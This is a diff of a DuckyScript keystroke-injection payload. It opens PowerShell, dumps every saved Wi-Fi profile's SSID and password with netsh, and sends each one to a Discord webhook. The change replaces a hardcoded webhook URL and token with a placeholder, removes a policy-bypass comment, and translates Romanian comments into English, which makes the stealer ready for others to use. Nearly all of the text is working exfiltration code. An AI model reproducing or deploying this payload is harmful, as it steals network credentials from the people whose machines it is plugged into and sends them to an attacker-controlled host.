@@ -30,7 +30,6 @@ REM              ......................
 REM
 
 DELAY 500
-REM Set the PowerShell execution policy to bypass
 GUI r
 DELAY 500
 STRING powershell
@@ -39,8 +38,8 @@ DELAY 500
 
 
 
-REM Set the webhook URL
-STRING $webhookUrl = "https://discord.com/api/webhooks/1189895448882843719/hzba0jO7iL0qzgPd-qXwwCNTgY6nm572J9HDxCic8JfmHQE3gkuF7hkekkNKgrjgCVpz"
+REM Set the webhook URL. Change YOUR-WEBHOOK-HERE with your discord webhook!
+STRING $webhookUrl = "YOUR-WEBHOOK-HERE" 
 ENTER
 STRING $wifiProfiles = netsh wlan show profiles | Where-Object { $_ -match "All User Profile" } | ForEach-Object { ($_ -split ":\s+", 2)[1] }
 ENTER
@@ -60,7 +59,7 @@ STRING         $ssid = $ssidMatch -replace '^\s+|\s+$|SSID name\s+: ', ''
 ENTER
 STRING         $keyContent = $keyMatch -replace '^\s+|\s+$|Key Content\s+: ', ''
 ENTER
-STRING         # Construiește mesajul pentru Discord
+STRING         # Create message for discord
 ENTER
 STRING         $discordMessage = @{
 ENTER
@@ -78,23 +77,23 @@ STRING             )
 ENTER
 STRING         } | ConvertTo-Json
 ENTER
-STRING         # Trimite mesajul la Webhook-ul Discord
+STRING         # Send message to discord webhook
 ENTER
 STRING         try {
 ENTER
 STRING             Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $discordMessage -ContentType "application/json" -ErrorAction Stop
 ENTER
-STRING             Write-Host "Mesajul a fost trimis cu succes pe Discord pentru SSID: $ssid"
+STRING             Write-Host "Message send succesfully for SSID: $ssid"
 ENTER
 STRING         } catch {
 ENTER
-STRING             Write-Host "Eroare la trimiterea mesajului pe Discord pentru SSID: $ssid"
+STRING             Write-Host "Error with sending message on discord for SSID: $ssid"
 ENTER
 STRING             Write-Host $_.Exception.Message
 ENTER
 STRING         }
 ENTER
-STRING         Start-Sleep -Seconds 0.5 # Așteaptă 5 secunde între mesaje
+STRING         Start-Sleep -Seconds 0.5
 ENTER
 STRING     }
 ENTER
